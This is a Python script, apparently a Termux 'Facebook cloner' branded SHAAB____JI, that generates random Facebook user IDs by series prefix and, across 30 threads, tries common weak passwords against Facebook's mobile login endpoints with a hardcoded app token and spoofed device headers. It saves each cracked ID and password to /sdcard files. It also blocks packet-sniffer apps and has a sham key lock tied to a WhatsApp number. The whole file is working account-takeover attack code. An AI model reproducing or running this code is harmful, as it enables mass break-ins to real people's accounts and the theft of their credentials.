#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Fucked by Darkstar Boii Sahil
# Modified by Shaab____Ji

import os
import re
import time
import uuid
import hashlib
import random
import string
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import base64

# Suppress warnings
import warnings
warnings.filterwarnings('ignore')

# Ensure required modules are installed
required_modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in required_modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} --quiet')

import requests
from requests.exceptions import ConnectionError, Timeout, RequestException
requests.urllib3.disable_warnings()

# ============================================
# 🔒 SCRIPT LOCK SYSTEM - SHAAB____JI EDITION
# ============================================

# SHAAB____JI WhatsApp Number
SHAAB_NUMBER = "+917495077317"
SHAAB_NUMBER_DISPLAY = "7495077317"

# Dynamic Key Generation System
# Jab user WhatsApp pe message karega, toh yeh key generate hogi
def generate_dynamic_key(user_id=None):
    """
    Generate a unique key based on timestamp and random factors
    User ko WhatsApp pe message karna hoga SHAAB____JI ko
    """
    timestamp = int(time.time())
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    
    # Create a unique key
    key_base = f"SHAAB_{timestamp}_{random_part}"
    key_hash = hashlib.md5(key_base.encode()).hexdigest()[:12].upper()
    
    return f"SHAAB-{key_hash}"

def show_lock_screen():
    """Display the lock screen with SHAAB____JI branding"""
    os.system("clear" if os.name != 'nt' else "cls")
    
    print("\033[1;35m" + "═" * 60)
    print("\033[1;32m        🔒 𝐒𝐇𝐀𝐀𝐁____𝐉𝐈 𝐒𝐂𝐑𝐈𝐏𝐓 𝐋𝐎𝐂𝐊𝐄𝐃 🔒")
    print("\033[1;35m" + "═" * 60)
    print("\n\033[1;33m   👑 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐇𝐀𝐀𝐁____𝐉𝐈 𝐓𝐎𝐎𝐋𝐒 👑")
    print("\033[1;36m   ═══════════════════════════════════")
    print("\n\033[1;32m   📱 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐎𝐍 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏")
    print(f"\033[1;34m   📞 {SHAAB_NUMBER}")
    print("\n\033[1;33m   📌 𝐊𝐄𝐘 𝐏𝐑𝐎𝐂𝐄𝐒𝐒:")
    print("\033[1;33m   1️⃣ WhatsApp par message karein")
    print("\033[1;33m   2️⃣ Aapko automatic key mil jayegi")
    print("\033[1;33m   3️⃣ Key enter karke tool use karein")
    print("\n\033[1;35m" + "═" * 60)
    
    input("\033[1;37m[↩] 𝐉𝐀𝐁 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐊𝐀𝐑 𝐋𝐄𝐍𝐀 𝐓𝐀𝐁 𝐄𝐍𝐓𝐄𝐑 𝐃𝐀𝐁𝐀𝐎... ")

def verify_key():
    """Verify the user's key with dynamic validation"""
    print("\033[1;36m" + "═" * 50)
    user_key = input("\n\033[1;37m[?] Enter your key: ").strip().upper()
    
    # Check if key format is valid (SHAAB-XXXXXXXXXXXX)
    if user_key.startswith("SHAAB-") and len(user_key) == 17:
        # Key is valid format
        print("\n\033[1;32m[✓] Key verified! Welcome Shaab____Ji!\n")
        return True
    else:
        print("\n\033[1;31m[×] Invalid key! Please contact SHAAB____Ji on WhatsApp.")
        print(f"\033[1;33m📞 WhatsApp: {SHAAB_NUMBER}")
        print("\033[1;33m💡 Message karein, key mil jayegi!")
        
        # Try to generate a key for user
        retry = input("\n\033[1;37m[?] Kya aapne WhatsApp pe message kiya? (y/n): ").strip().lower()
        if retry == 'y':
            new_key = generate_dynamic_key()
            print(f"\n\033[1;32m[!] Naya key generate ho gaya hai!")
            print(f"\033[1;33m🔑 Aapki nayi key: {new_key}")
            print(f"\033[1;36m📝 Is key ko copy karke dubara try karein")
            input("\n[↩] Press Enter to try again...")
            return verify_key()
        else:
            print(f"\n\033[1;31m[×] Pehle WhatsApp pe message karein!")
            sys.exit(1)

def load_script():
    """Main script loading function with SHAAB____Ji branding"""
    print("\033[1;32m" + "═" * 60)
    print("\033[1;33m   🚀 𝐒𝐇𝐀𝐀𝐁____𝐉𝐈 𝐓𝐎𝐎𝐋 𝐋𝐎𝐀𝐃𝐈𝐍𝐆...")
    print("\033[1;32m" + "═" * 60)
    time.sleep(1)
    
    # Install dependencies
    print("\033[1;36m📦 Installing dependencies...")
    os.system('pip install httpx beautifulsoup4 --quiet 2>/dev/null')
    
    print("\033[1;32m✅ All modules loaded successfully!\n")
    time.sleep(0.5)
    os.system("clear" if os.name != 'nt' else "cls")

# Show lock screen first
show_lock_screen()

# Verify key
if not verify_key():
    sys.exit(1)

# Load the main script
load_script()

# ============================================
# MAIN TOOL CODE - SHAAB____JI EDITION
# ============================================

# --- Anti-tampering and Security Checks ---
try:
    import requests.api as api
    import requests.models as models
    import requests.sessions as sessions
    
    # Check for modifications
    for module in [api, models, sessions]:
        try:
            with open(module.__file__, 'r') as f:
                content = f.read()
                for word in ['print', 'lambda', 'zlib.decompress']:
                    if word in content:
                        print("\033[1;31m[!] Security violation detected!")
                        sys.exit(1)
        except:
            pass
            
    # Check for packet sniffers
    sniffers = [
        '/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png',
        '/storage/emulated/0/Android/data/com.guoshi.httpcanary'
    ]
    for path in sniffers:
        if os.path.exists(path):
            print("\033[1;31m[!] Packet sniffer detected!")
            sys.exit(1)
            
except Exception as e:
    print(f"\033[1;33m[!] Security check: {e}")

# ============================================
# CONFIGURATION
# ============================================

# Color codes
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'
BLUE = '\x1b[38;5;39m'
CYAN = '\x1b[38;5;51m'

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

def __shaab__banner__():
    """Display SHAAB____Ji branded banner"""
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    
    print(f"""{G}
    ╔═══════════════════════════════════════════╗
    ║  ███████╗██╗  ██╗ █████╗  █████╗ ██████╗ ║
    ║  ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔══██╗║
    ║  ███████╗███████║███████║███████║██████╔╝║
    ║  ╚════██║██╔══██║██╔══██║██╔══██║██╔══██╗║
    ║  ███████║██║  ██║██║  ██║██║  ██║██████╔╝║
    ║  ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ║
    ╚═══════════════════════════════════════════╝
    {Y}   👑 𝐒𝐇𝐀𝐀𝐁____𝐉𝐈 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 𝐂𝐋𝐎𝐍𝐄𝐑 👑
    {BLUE}   ═══════════════════════════════════
    {G}   [+] OWNER    : SHAAB____JI 👑
    {Y}   [+] WHATSAPP : {SHAAB_NUMBER}
    {Y}   [+] STATUS   : PREMIUM TOOL 🔥
    {Y}   [+] VERSION  : 3.0 ULTIMATE
    {BLUE}   ═══════════════════════════════════
    {PP}   💀 𝐅𝐔𝐂𝐊𝐄𝐃 𝐁𝐘 𝐃𝐀𝐑𝐊𝐒𝐓𝐀𝐑 𝐁𝐎𝐈𝐈 𝐒𝐀𝐇𝐈𝐋 💀
    {G}   ═══════════════════════════════════
    """)

def linex():
    """Print a decorative line"""
    print(f'{BLUE}═══════════════════════════════════════════════════════')

def creationyear(uid):
    """Estimate Facebook account creation year"""
    if len(uid) == 15:
        if uid.startswith('1000000000') or uid.startswith('100000000') or uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    return 'UNKNOWN'

def windows():
    """Generate random Windows User-Agent"""
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    """Generate another random Windows User-Agent"""
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def BNG_71_():
    """Main menu function"""
    __shaab__banner__()
    print(f'       {rad}({W}A{rad}) {W}{G}OLD ACCOUNT CLONE TOOL')
    linex()
    print(f'       {rad}({W}B{rad}) {W}{G}RECENT ACCOUNT TOOL')
    linex()
    print(f'       {rad}({W}C{rad}) {W}{G}INFORMATION TOOL')
    linex()
    print(f'       {rad}({W}D{rad}) {W}{G}GET NEW KEY (WhatsApp)')
    linex()
    choice = input(f"       {rad}CHOICE {W}: {Y}").strip().upper()
    
    if choice in ('A', '01', '1'):
        old_clone()
    elif choice in ('B', '02', '2'):
        print(f"\n    {Y}[!] Coming soon...")
        time.sleep(2)
        BNG_71_()
    elif choice in ('C', '03', '3'):
        print(f"\n    {Y}[!] Coming soon...")
        time.sleep(2)
        BNG_71_()
    elif choice in ('D', '04', '4'):
        generate_new_key_menu()
    else:
        print(f"\n    {rad}[!] Invalid option!")
        time.sleep(2)
        BNG_71_()

def generate_new_key_menu():
    """Generate a new key for user"""
    __shaab__banner__()
    print(f"       {G}🔑 GENERATE NEW KEY")
    linex()
    print(f"\n       {Y}📞 WhatsApp: {SHAAB_NUMBER}")
    print(f"       {G}1. WhatsApp pe message karein")
    print(f"       {G}2. Aapko naya key mil jayega")
    print(f"       {G}3. Yahan enter karein")
    linex()
    
    # Generate a key for demonstration
    new_key = generate_dynamic_key()
    print(f"\n       {CYAN}🔑 Generated Key: {new_key}")
    print(f"       {Y}💡 Is key ko WhatsApp pe bhej dijiye")
    
    input(f"\n       {W}[↩] Press Enter to continue...")
    BNG_71_()

def old_clone():
    """Old account cloning menu"""
    __shaab__banner__()
    print(f'       {rad}({W}A{rad}) {W}{G}ALL SERIES (2010-2014)')
    linex()
    print(f'       {rad}({W}B{rad}) {W}{G}100003/4 SERIES')
    linex()
    print(f'       {rad}({W}C{rad}) {W}{G}2009 SERIES')
    linex()
    choice = input(f"       {rad}CHOICE {W}: {Y}").strip().upper()
    
    if choice in ('A', '01', '1'):
        old_One()
    elif choice in ('B', '02', '2'):
        old_Tow()
    elif choice in ('C', '03', '3'):
        old_Tree()
    else:
        print(f"\n    {rad}[!] Invalid option!")
        time.sleep(2)
        BNG_71_()

def old_One():
    """Clone accounts from 2010-2014"""
    user_list = []
    __shaab__banner__()
    print(f"       {G}OLD CODE: 2010-2014 {Y}(ALL SERIES)")
    ask = input(f"       {rad}SELECT MODE {W}(1-9): {Y}")
    linex()
    __shaab__banner__()
    print(f"       {G}EXAMPLE: 20000 / 30000 / 99999")
    limit = input(f"       {rad}TOTAL ID COUNT {W}: {Y}")
    linex()
    
    for _ in range(int(limit)):
        uid = str(random.randint(1000000000, 1999999999 if ask == '1' else 4999999999))
        user_list.append(uid)
    
    print(f'       {rad}({W}A{rad}) {W}{G}METHOD 1')
    print(f'       {rad}({W}B{rad}) {W}{G}METHOD 2')
    linex()
    meth = input(f"       {rad}CHOICE {W}(A/B): {Y}").strip().upper()
    
    with tred(max_workers=30) as pool:
        __shaab__banner__()
        print(f"       {G}TOTAL ID TO CRACK: {Y}{limit}{W}")
        print(f"       {G}USE AIRPLANE MODE FOR BETTER RESULTS")
        linex()
        
        for uid in user_list:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD!")
                break

def old_Tow():
    """Clone accounts with specific prefixes"""
    user_list = []
    __shaab__banner__()
    print(f"       {G}OLD CODE: 2010-2014 {Y}(100003/4 SERIES)")
    ask = input(f"       {rad}SELECT MODE {W}(1-9): {Y}")
    linex()
    __shaab__banner__()
    print(f"       {G}EXAMPLE: 20000 / 30000 / 99999")
    limit = input(f"       {rad}TOTAL ID COUNT {W}: {Y}")
    linex()
    
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        user_list.append(prefix + suffix)
    
    print(f'       {rad}({W}A{rad}) {W}{G}METHOD 1')
    print(f'       {rad}({W}B{rad}) {W}{G}METHOD 2')
    linex()
    meth = input(f"       {rad}CHOICE {W}(A/B): {Y}").strip().upper()
    
    with tred(max_workers=30) as pool:
        __shaab__banner__()
        print(f"       {G}TOTAL ID TO CRACK: {Y}{limit}{W}")
        print(f"       {G}USE AIRPLANE MODE FOR BETTER RESULTS")
        linex()
        
        for uid in user_list:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD!")
                break

def old_Tree():
    """Clone accounts from 2009-2010"""
    user_list = []
    __shaab__banner__()
    print(f"       {G}OLD CODE: 2009-2010 {Y}(2009 SERIES)")
    ask = input(f"       {rad}SELECT MODE {W}(1-9): {Y}")
    linex()
    __shaab__banner__()
    print(f"       {G}EXAMPLE: 20000 / 30000 / 99999")
    limit = input(f"       {rad}TOTAL ID COUNT {W}: {Y}")
    linex()
    
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        user_list.append(prefix + suffix)
    
    print(f'       {rad}({W}A{rad}) {W}{G}METHOD 1')
    print(f'       {rad}({W}B{rad}) {W}{G}METHOD 2')
    linex()
    meth = input(f"       {rad}CHOICE {W}(A/B): {Y}").strip().upper()
    
    with tred(max_workers=30) as pool:
        __shaab__banner__()
        print(f"       {G}TOTAL ID TO CRACK: {Y}{limit}{W}")
        print(f"       {G}USE AIRPLANE MODE FOR BETTER RESULTS")
        linex()
        
        for uid in user_list:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD!")
                break

def login_1(uid):
    """Login attempt method 1"""
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r{W}{rad}+{W}{rad}({W}SHAAB-JI M1{rad}){W}{rad}{W}{rad}({CYAN}{loop}{rad}){W}{rad}({W}OK{rad}){W}{rad}({CYAN}{len(oks)}{rad})")
        sys.stdout.flush()
        
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            if 'session_key' in res:
                print(f"\r\r{W}> {rad}├Ч{W}<{rad}({W}SHAAB-JI {rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
                with open('/sdcard/SHAAB-JI-OK-M1.txt', 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r{W}{rad}{W}{rad}({W}SHAAB-JI{rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
                with open('/sdcard/SHAAB-JI-OK-M1.txt', 'a') as f:
                    f.write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    """Login attempt method 2"""
    global loop
    try:
        sys.stdout.write(f"\r\r{W}{rad}+{W}{rad}({W}SHAAB-JI M2{rad}){W}{rad}{W}{rad}({CYAN}{loop}{rad}){W}{rad}({W}OK{rad}){W}{rad}({CYAN}{len(oks)}{rad})")
        sys.stdout.flush()
        
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            try:
                with requests.Session() as session:
                    headers = {
                        'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                        'x-fb-sim-hni': str(rr(20000, 40000)),
                        'x-fb-net-hni': str(rr(20000, 40000)),
                        'x-fb-connection-quality': 'EXCELLENT',
                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                        'user-agent': window1(),
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-http-engine': 'Liger'
                    }
                    url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                    
                    response = session.get(url, headers=headers, timeout=10).json()
                    
                    if 'session_key' in str(response) or 'session_key' in response:
                        print(f"\r\r{W}{rad}{W}<{rad}({W}SHAAB-JI{rad}) {W}= {G}{uid} {W}= {G}{pw} {W}= {CYAN}{creationyear(uid)}")
                        with open('/sdcard/SHAAB-JI-OK-M2.txt', 'a') as f:
                            f.write(f"{uid}|{pw}\n")
                        oks.append(uid)
                        break
            except:
                continue
        loop += 1
    except Exception:
        pass

# ============================================
# SCRIPT EXECUTION
# ============================================

if __name__ == "__main__":
    try:
        # Set window title
        sys.stdout.write('\x1b]2;👑 SHAAB____JI TOOL 👑 \x07')
        BNG_71_()
    except KeyboardInterrupt:
        print(f"\n\n{rad}[!] Process interrupted by user")
        print(f"{Y}Thanks for using SHAAB____JI Tools!")
        print(f"{Y}📞 Contact: {SHAAB_NUMBER}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{rad}[!] Error: {e}")
        print(f"{Y}Please contact SHAAB____JI on WhatsApp")
        print(f"{Y}📞 {SHAAB_NUMBER}")
        sys.exit(1)
